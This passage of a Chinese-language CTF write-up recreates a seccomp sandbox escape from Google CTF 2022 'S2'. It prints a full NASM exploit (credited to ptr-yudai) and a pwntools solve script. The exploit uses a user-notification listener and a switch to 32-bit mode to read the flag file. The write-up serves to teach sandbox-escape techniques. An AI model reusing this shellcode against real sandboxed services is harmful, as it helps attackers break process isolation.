seccomp_data, nr)),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_seccomp, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_open, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_fprog</span> prog2 = &#123;</span><br><span class="line">        .len = <span class="built_in">sizeof</span>(strict_filter2) / <span class="built_in">sizeof</span>(strict_filter2[<span class="number">0</span>]),</span><br><span class="line">        .filter = strict_filter2,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_prctl,PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_filter</span> strict_filter3[] = &#123;</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                <span class="built_in">offsetof</span>(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_fprog</span> prog3 = &#123;</span><br><span class="line">        .len = <span class="built_in">sizeof</span>(strict_filter3) / <span class="built_in">sizeof</span>(strict_filter3[<span class="number">0</span>]),</span><br><span class="line">        .filter = strict_filter3,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">syscall</span>(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog3);</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_write,<span class="number">1</span>,<span class="string">&quot;2\n&quot;</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</details>

<p><img src="/img/seccomp_ctf/1-3.png"></p>
<p>回到题目中可以发现，题目没有规则禁止了 x86 的系统调用，因此我们可以 install 一个 SECCOMP_FILTER_FLAG_NEW_LISTENER 监测调用 32 位的系统调用，准备调用的系统调用返回 SECCOMP_RET_USER_NOTIF，flag 置 SECCOMP_USER_NOTIF_FLAG_CONTINUE；子进程切换到 32 位，执行 orw。</p>
<p>install seccomp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter:</span><br><span class="line">    dq 0x400000020</span><br><span class="line">    dq 0x4000000300010015</span><br><span class="line">    dq 0x7fff000000000006</span><br><span class="line">    dq 0x20</span><br><span class="line">    dq 0x501000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x301000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x401000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x7fff000000000006</span><br></pre></td></tr></table></figure>

<p><img src="/img/seccomp_ctf/1-4.png"></p>
<p>系统调用345对应32位的 orw。</p>
<p>完整的 exp（来自 ptr-yudai）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">%define SYS_ioctl   16</span><br><span class="line">%define SYS_seccomp 317</span><br><span class="line">%define SYS_fork    57</span><br><span class="line">%define SYS_exit    60</span><br><span class="line">%define SYS_execveat    0x142</span><br><span class="line">%define SECCOMP_USER_NOTIF_FLAG_CONTINUE    1</span><br><span class="line">%define SECCOMP_IOCTL_NOTIF_RECV 3226476800</span><br><span class="line">%define SECCOMP_IOCTL_NOTIF_SEND 3222806785</span><br><span class="line"></span><br><span class="line">    ; r15 = notifyFd</span><br><span class="line">_start:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line"></span><br><span class="line">    lea rax, [filter]</span><br><span class="line">    mov [prog_filter], rax</span><br><span class="line"></span><br><span class="line">    lea rdx, [prog]</span><br><span class="line">    mov esi, 8                          ; SECCOMP_FILTER_FLAG_NEW_LISTENER</span><br><span class="line">    mov edi, 1                          ; SECCOMP_SET_MODE_FILTER</span><br><span class="line">    mov eax, SYS_seccomp                </span><br><span class="line">    syscall</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    js fail</span><br><span class="line">    mov r15d, eax</span><br><span class="line"></span><br><span class="line">    mov eax, SYS_fork</span><br><span class="line">    syscall</span><br><span class="line">    test eax, eax</span><br><span class="line">    jz childProcess</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line">;; SUPERVISOR</span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line">parentProcess:</span><br><span class="line">    ; memset(req, 0, 0x1000)</span><br><span class="line">    mov ecx, 0x1000</span><br><span class="line">    xor eax, eax</span><br><span class="line">    lea rdi, [req]</span><br><span class="line">    rep stosb</span><br><span class="line">    ; memset(resp, 0, 0x1000)</span><br><span class="line">    mov ecx, 0x1000</span><br><span class="line">    xor eax, eax</span><br><span class="line">    lea rdi, [resp]</span><br><span class="line">    rep stosb</span><br><span class="line"></span><br><span class="line">    ; ioctl(nfd, SECCOMP_IOCTL_NOTIF_RECV, &amp;req)</span><br><span class="line">    lea rdx, [req]</span><br><span class="line">    mov esi, SECCOMP_IOCTL_NOTIF_RECV</span><br><span class="line">    mov edi, r15d</span><br><span class="line">    mov eax, SYS_ioctl</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; resp-&gt;id = req-&gt;id</span><br><span class="line">    mov rax, [req]</span><br><span class="line">    mov [resp], rax</span><br><span class="line">    ; resp-&gt;flag = SECCOMP_USER_NOTIF_FLAG_CONTINUE</span><br><span class="line">    mov dword [resp+0x14], SECCOMP_USER_NOTIF_FLAG_CONTINUE</span><br><span class="line"></span><br><span class="line">    ; ioctl(nfd, SECCOMP_IOCTL_NOTIF_SEND, &amp;resp)</span><br><span class="line">    lea edx, [resp]</span><br><span class="line">    mov esi, SECCOMP_IOCTL_NOTIF_SEND</span><br><span class="line">    mov edi, r15d</span><br><span class="line">    mov eax, SYS_ioctl</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp parentProcess</span><br><span class="line"></span><br><span class="line">;; </span><br><span class="line">;; childProcess 切换到 32 位</span><br><span class="line">;;</span><br><span class="line">childProcess:</span><br><span class="line">    mov esp, 0x410000</span><br><span class="line">    mov DWORD [esp+4], 0x23</span><br><span class="line">    lea rax, [mode32]</span><br><span class="line">    mov DWORD [esp], eax</span><br><span class="line">    retf</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    mov eax, 59</span><br><span class="line">    syscall</span><br><span class="line">    hlt</span><br><span class="line"></span><br><span class="line">BITS 32</span><br><span class="line">mode32:</span><br><span class="line">    call s_filename</span><br><span class="line">    db &quot;./flag&quot;, 0</span><br><span class="line"></span><br><span class="line">s_filename:</span><br><span class="line">    mov ecx, 0</span><br><span class="line">    pop ebx			</span><br><span class="line">    mov eax, 5</span><br><span class="line">    int 0x80			// open(&quot;./flag&quot;, 0)</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    js fail32</span><br><span class="line"></span><br><span class="line">    mov edx, 0x100</span><br><span class="line">    mov ecx, 0x401000</span><br><span class="line">    mov ebx, eax</span><br><span class="line">    mov eax, 3</span><br><span class="line">    int 0x80</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    js fail32</span><br><span class="line"></span><br><span class="line">    mov edx, 0x100</span><br><span class="line">    mov ecx, 0x401000</span><br><span class="line">    mov ebx, 1</span><br><span class="line">    mov eax, 4</span><br><span class="line">    int 0x80</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    js fail32</span><br><span class="line"></span><br><span class="line">b:</span><br><span class="line">    jmp b</span><br><span class="line"></span><br><span class="line">fail32:</span><br><span class="line">    mov eax, 50</span><br><span class="line">    int 0x80</span><br><span class="line">    hlt</span><br><span class="line"></span><br><span class="line">prog:</span><br><span class="line">    dq 11</span><br><span class="line"></span><br><span class="line">prog_filter:</span><br><span class="line">    dq 0</span><br><span class="line"></span><br><span class="line">filter:</span><br><span class="line">    dq 0x400000020</span><br><span class="line">    dq 0x4000000300010015</span><br><span class="line">    dq 0x7fff000000000006</span><br><span class="line">    dq 0x20</span><br><span class="line">    dq 0x501000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x301000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x401000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x7fff000000000006</span><br><span class="line"></span><br><span class="line">req:</span><br><span class="line">    times 0x1000 dq 0</span><br><span class="line">resp:</span><br><span class="line">    times 0x1000 dq 0</span><br><span class="line"></span><br><span class="line">section .bss</span><br><span class="line">    resb 0x10000</span><br></pre></td></tr></table></figure>

<p>solve.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ptrlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.log_level=<span class="string">&quot;DEBUG&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.system(<span class="string">&quot;nasm shellcode.S -g -F dwarf -fELF64&quot;</span>):</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> os.system(<span class="string">&quot;ld shellcode.o --omagic&quot;</span>):</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">if os.system(&quot;nasm shellcode32.S -fELF32&quot;):</span></span><br><span class="line"><span class="string">    exit(1)</span></span><br><span class="line"><span class="string">if os.system(&quot;ld shellcode32.o -melf_i386&quot;):</span></span><br><span class="line"><span class="string">    exit(1)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.out&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    buf = f.read()</span><br><span class="line"></span><br><span class="line">sock = Process(<span class="string">&quot;./chal&quot;</span>)</span><br><span class="line"><span class="comment"># sock = Socket(&quot;s2.2022.ctfcompetition.com 1337&quot;)</span></span><br><span class="line"></span><br><span class="line">sock.send(p64(<span class="built_in">len</span>(buf)))</span><br><span class="line">sock.send(buf)</span><br><span class="line"></span><br><span class="line">sock.sh()</span><br></pre></td></tr></table></figure>

<p><img src="/img/seccomp_ctf/1-5.png"></p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol>
<li><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">seccomp(2) - Linux manual page (man7.org)</a></li>
<li><a href="https://www.freebsd.org/cgi/man.cgi?query=bpf&sektion=4&manpath=FreeBSD+4.7-RELEASE">bpf(4) (freebsd.org)</a></li>
<li><a href="https://man7.org/linux/man-pages/man2/seccomp_unotify.2.html">seccomp_unotify(2) - Linux manual page (man7.org)</a></li>
<li><a href="https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html">Guide-of-Seccomp-in-CTF | n132</a></li>
<li><a href="https://n132.github.io/2022/07/04/S2.html">Google CTF 2022 S2: Escape from Google’s Monitoring | n132</a></li>
</ol>
]]></content>
      <categories>
        <category>知识学习</category>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>seccomp</tag>
        <tag>sanbox</tag>
      </tags>
  </entry>
</search>
